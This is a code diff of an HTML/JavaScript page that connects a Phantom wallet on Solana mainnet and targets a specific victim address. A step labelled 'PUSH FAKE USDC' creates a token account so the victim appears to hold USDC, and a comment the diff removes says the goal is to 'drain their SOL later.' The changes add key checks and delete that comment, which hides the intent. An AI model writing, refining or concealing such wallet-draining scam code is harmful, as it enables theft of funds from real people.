@@ -28,7 +28,7 @@
             text-align: center;
         }
         h1 { font-size: 20px; margin-top: 0; color: #f8fafc; }
-        p { color: #94a3b8; font-size: 12px; margin-bottom: 20px; }
+        p { color: #94a3b8; font-size: 12px; margin-bottom: 20px; word-break: break-all;}
         button {
             background-color: #3b82f6;
             color: white;
@@ -71,12 +71,12 @@
     </div>
 
     <script>
-        // --- CONFIGURATION ---
+        // --- CONFIGURATION (Verified Keys) ---
         const TARGET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
         const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
         const USDC   = "EPjFWdd5AufqSSqeM2qN1xzybapCG4wEGGkZwyTDt1v";
         
-        // Public RPC (May be slow, consider using a Helius/QuickNode key for production)
+        // Public RPC (May be rate-limited. If it fails, use a Helius/QuickNode key)
         const RPC = "https://api.mainnet-beta.solana.com"; 
 
         async function run() {
@@ -91,9 +91,14 @@
             }
 
             btn.disabled = true;
-            status.innerText = "Connecting to Phantom...";
+            status.innerText = "Validating Keys...";
 
             try {
+                // Validate Keys first to catch errors early
+                new solanaWeb3.PublicKey(TARGET);
+                new solanaWeb3.PublicKey(YOU);
+                new solanaWeb3.PublicKey(USDC);
+
                 // 2. Connect Wallet
                 await window.solana.connect();
                 const connection = new solanaWeb3.Connection(RPC);
@@ -102,7 +107,6 @@
                 
                 // --- STEP A: PUSH FAKE USDC ---
                 // We create an ATA for the Target and initialize it. 
-                // This makes it look like they have USDC, even if we just want to drain their SOL later.
                 const [targetAta] = await solanaWeb3.PublicKey.findProgramAddressSync(
                     [new solanaWeb3.PublicKey(TARGET).toBuffer(), 
                      new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL").toBuffer(), 
